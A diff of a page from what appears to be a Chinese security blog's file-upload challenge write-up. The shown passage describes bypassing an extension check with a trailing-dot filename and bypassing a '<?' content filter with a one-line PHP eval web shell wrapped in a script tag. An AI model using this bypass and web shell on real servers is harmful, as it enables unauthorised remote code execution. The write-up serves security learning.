@@ -198,7 +198,7 @@
 <p>用burp suite抓包，发送到repeater进行测试，当文件内容中含有<code>&lt;?</code>时，会显示<code>&amp;lt;? in contents!</code></p>
 <p>所以大致就是需要绕过后缀名检测和文件内容检测，先突破后缀名识别，载考虑内容检测。</p>
 <p>尝试 <code>test.Php</code> <code>test.phpphp</code> <code>test.php.jpg</code> 00截断  <code>test.php;.jpg</code> 都不行，最后使用 <code>test.php.</code> 成功绕过后缀名检测。</p>
-<p><img src="/2019/07/20/文件上传/C:/Users\Administrator\Desktop\img\1563523275116.png" alt="1563523275116"></p>
+<p><img src="/2019/07/20/文件上传/1563523275116.png" alt></p>
 <p>下一步绕过文件内容检测，因为php的开头必须为&lt;? 所以要不就是绕过检测 要不就是文件内容里没有&lt;?这两个字符。</p>
 <p>经过查资料，可以在js中添加php代码，具体为</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">'php'</span>&gt;</span><br><span class="line">	@<span class="built_in">eval</span>($_POST[a]);</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
@@ -411,6 +411,12 @@
         <a href="/2019/05/21/心脏滴血漏洞简单分析与复现/" target="_self">心脏滴血漏洞简单分析与复现</a>
       </div>
     
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/2019/07/30/两种利用js反弹shell的方式/" target="_self">两种利用js反弹shell的方式</a>
+        <i class="iconfont icon-next"></i>
+      </div>
     
   </nav>
 
